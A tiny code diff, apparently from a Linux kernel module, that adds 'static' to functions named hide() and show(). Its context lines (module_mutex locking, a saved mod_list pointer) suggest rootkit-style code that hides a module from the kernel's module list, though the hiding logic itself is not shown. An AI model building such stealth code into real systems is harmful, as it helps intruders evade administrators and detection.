@@ -7,6 +7,7 @@
 int hide_m = 0;
 static struct list_head *mod_list;
 
+static
 void hide(void)
 {
 	while (!mutex_trylock(&module_mutex))
@@ -20,6 +21,7 @@ void hide(void)
 	hide_m = 1;
 }
 
+static
 void show(void)
 {
 	while (!mutex_trylock(&module_mutex))
